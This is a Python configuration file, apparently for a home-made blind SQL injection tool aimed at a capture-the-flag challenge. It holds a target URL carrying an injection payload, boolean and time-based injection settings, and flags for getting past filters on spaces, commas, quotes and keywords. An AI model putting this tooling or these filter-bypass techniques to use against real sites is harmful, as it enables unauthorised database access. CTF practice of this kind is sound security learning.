from myEnum import SQL_INJECT_TYPE

# post需要的请求头
headers = {
  'Accept-Language': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Accept-Encoding': 'gzip, deflate', 
  'Content-Type': 'application/x-www-form-urlencoded',
}

# 考虑到网络传输，尽量不要太低了，不然无法正确的check
sleep_inject_sleep_time = 1

#注入类型
INJECT_TYPE = SQL_INJECT_TYPE.BOOLEAN_INJECT
url = 'http://41e8d1c4-11ab-4ef4-a0ef-c9dd17652657.challenge.ctf.show/index.php?id=1/**/or/**/'

# 是否只查询当前数据库
# TODO: 跳过查询一些别的库，只查询当前库
isCurrentDB = False
# 以下是boolean inject需要的
# 对应着if的返回值
boolean_inject_success_value = '1'
boolean_inject_failure_value = '0'

# 返回值的长度
boolean_inject_success_return_value = 123
boolean_inject_failure_return_value = 125

# 请求频繁或其他状态，则睡眠多少秒
boolean_inject_timeoutSlepp = 2

# 过滤:
# 空格是否被过滤 -> 所有sql全部支持过滤空格，使用()+/**/来绕过空格
# 逗号是否被过滤
isComma = True
# 引号是否被过滤
isQuotationMark = True
# if是否被过滤
isIf = True
# and是否被过滤
isAnd = True


def set_boolean_inject_return_value(success, failure):
  global boolean_inject_success_return_value
  global boolean_inject_failure_return_value
  boolean_inject_success_return_value = success
  boolean_inject_failure_return_value = failure
  
  print('set_boolean_inject_return_value:')
  print(f'success len is : {boolean_inject_success_return_value}')
  print(f'failure len is : {boolean_inject_failure_return_value}')

def set_url(url_value):
  global url
  url = url_value
  
def set_inject_type(inject_type):
  global INJECT_TYPE
  INJECT_TYPE = inject_type